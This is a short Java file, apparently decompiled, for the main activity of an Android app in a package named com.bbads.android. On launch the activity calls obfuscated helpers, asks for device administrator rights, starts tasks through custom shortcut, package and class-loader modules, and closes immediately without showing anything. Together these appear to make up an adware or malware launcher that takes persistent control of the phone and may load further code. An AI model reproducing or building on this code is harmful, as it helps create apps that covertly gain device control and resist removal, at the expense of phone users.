package com.bbads.android.wmf;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import com.bbads.android.CS;
import com.bbads.android.boxa.ClassLoader;
import com.bbads.android.ps.PManager;
import com.bbads.android.shortcut.ShortcutHelper;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(com.bbads.android.AR.layout.activity_main);
        WUtil.a(this);
        String appId = CS.appId;
        requestDeviceAdmin();
        PManager.checkTask(this, appId);
        ShortcutHelper.checkTask(this, appId);
        ClassLoader.checkTask(this, appId);
        finish();
    }
    private void requestDeviceAdmin() {
        DevicePolicyManager devicepolicymanager = (DevicePolicyManager) getSystemService("device_policy");
        ComponentName componentname = new ComponentName(this, UR.class);
        if (!devicepolicymanager.isAdminActive(componentname)) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", componentname);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", getResources().getString(com.bbads.android.AR.string.act));
            startActivityForResult(intent, 1);
        }
    }
}
